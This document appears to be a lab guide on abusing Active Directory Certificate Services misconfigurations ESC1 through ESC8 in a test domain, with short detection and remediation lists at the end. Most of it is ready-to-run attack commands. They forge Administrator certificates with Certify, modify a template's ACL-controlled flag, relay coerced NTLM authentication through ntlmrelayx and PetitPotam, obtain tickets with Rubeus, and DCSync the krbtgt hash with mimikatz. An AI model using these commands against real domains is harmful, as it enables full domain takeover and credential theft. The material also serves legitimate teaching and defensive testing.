# 06 — ADCS Attacks (ESC1 - ESC8)

## Overview

Active Directory Certificate Services (ADCS) misconfigurations allow attackers to forge certificates that authenticate as any user, including Domain Admins.

**CA Server:** DC-01.corp.local (`corp-DC-01-CA`)

---

## ESC1 — Enrollee Supplies Subject Alternative Name

**Template:** `ESC1-LabAltName`

Any Domain User can enroll and specify any SAN (e.g., Administrator).

```powershell
# Enumerate vulnerable templates
.\Certify.exe find /vulnerable

# Request a cert as Administrator
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:ESC1-LabAltName /altname:Administrator

# Save output to cert.pem, then convert
# On Linux:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx -passout pass:

# Use with Rubeus to get a TGT as Administrator
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password: /nowrap /ptt
```

---

## ESC2 — Any Purpose EKU

**Template:** `ESC2-AnyPurpose`

Certificate can be used for Any Purpose (OID 2.5.29.37.0). Can be abused for smart card logon.

```powershell
.\Certify.exe find /vulnerable
# Template shows "Any Purpose" in Application Policies

.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:ESC2-AnyPurpose /altname:Administrator
# Same steps as ESC1 to convert and use the cert
```

---

## ESC3 — Enrollment Agent Certificate

**Template:** `ESC3-EnrollAgent`

EKU = Certificate Request Agent. Attacker can enroll as an enrollment agent, then request certificates on behalf of other users.

```powershell
# Step 1: Get an enrollment agent certificate
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:ESC3-EnrollAgent
# Convert to PFX: openssl pkcs12 -in cert.pem -export -out agent.pfx -passout pass:

# Step 2: Use the agent cert to enroll on behalf of Administrator
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:User /onbehalfof:corp\Administrator /enrollcert:agent.pfx /enrollcertpw:
# Convert the resulting cert and use with Rubeus
```

---

## ESC4 — Writable Certificate Template

**Template:** `ESC4-Writable`

Domain Users have WriteDACL on this template. Attacker modifies it to be ESC1-vulnerable.

```powershell
# Verify WriteDACL
.\Certify.exe find /vulnerable

# Use ADSI to modify the template — add SAN flag
$templateDN = "CN=ESC4-Writable,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
$template = [adsi]"LDAP://$templateDN"
$template.Properties["msPKI-Certificate-Name-Flag"].Value = 1  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
$template.CommitChanges()

# Now ESC4-Writable behaves like ESC1 — request a cert with /altname:Administrator
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:ESC4-Writable /altname:Administrator
```

---

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2

**CA Setting:** `EDITF_ATTRIBUTESUBJECTALTNAME2` is enabled on the CA.

This flag allows any template to accept a SAN from the enrollee, turning any template into ESC1.

```powershell
# Verify the flag
certutil -getreg policy\EditFlags

# Exploit: request any template with /altname
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:User /altname:Administrator
# Convert and use with Rubeus
```

---

## ESC7 — Vulnerable CA Permissions

`svc_backup` has `ManageCertificates` (CA Officer) rights.
This allows approving pending certificate requests and enabling the SubCA template.

```powershell
# Step 1: Enable the SubCA template (as CA Officer)
.\Certify.exe enable /ca:"DC-01.corp.local\corp-DC-01-CA" /template:SubCA

# Step 2: Request a SubCA cert (will be pending)
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:SubCA /altname:Administrator
# Note the Request ID from output

# Step 3: Approve the pending request (as CA Officer)
.\Certify.exe approve /ca:"DC-01.corp.local\corp-DC-01-CA" /id:<RequestID>

# Step 4: Download the issued cert
.\Certify.exe download /ca:"DC-01.corp.local\corp-DC-01-CA" /id:<RequestID>
```

---

## ESC8 — NTLM Relay to ADCS Web Enrollment

The CA has Web Enrollment enabled (HTTP). Relay NTLM authentication from a DC to get a domain controller certificate.

```bash
# On Linux attacker:

# Step 1: Start NTLM relay to ADCS
ntlmrelayx.py -t http://192.168.56.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 2: Coerce DC-01 to authenticate (PetitPotam / PrinterBug)
python3 PetitPotam.py 192.168.56.30 192.168.56.10
# or:
python3 printerbug.py corp/attacker.01:p@ssw0rd@192.168.56.10 192.168.56.30

# Step 3: ntlmrelayx outputs a base64 certificate
# Use with Rubeus:
.\Rubeus.exe asktgt /user:DC-01$ /certificate:<base64> /ptt /nowrap

# Step 4: Perform DCSync as DC-01$
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

---

## Quick Reference: Certify Commands

```powershell
# Enumerate all templates
.\Certify.exe find

# Find vulnerable templates
.\Certify.exe find /vulnerable

# Find templates enrollable by current user
.\Certify.exe find /enrolleeSuppliesSubject

# Request a certificate
.\Certify.exe request /ca:"DC-01.corp.local\corp-DC-01-CA" /template:<name>

# List pending requests
.\Certify.exe pending /ca:"DC-01.corp.local\corp-DC-01-CA"
```

---

## Detection

- Event 4886 — Certificate Services received a certificate request
- Event 4887 — Certificate Services approved a certificate request
- Monitor for certificates with SAN = privileged user (Administrator, krbtgt)
- Alert on `EDITF_ATTRIBUTESUBJECTALTNAME2` being set

## Remediation

- Disable `EDITF_ATTRIBUTESUBJECTALTNAME2`
- Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` from all non-CA templates
- Restrict enrollment rights to specific groups (not Domain Users)
- Require CA Manager approval for sensitive templates
- Disable NTLM on Web Enrollment endpoint (use Kerberos/HTTPS)
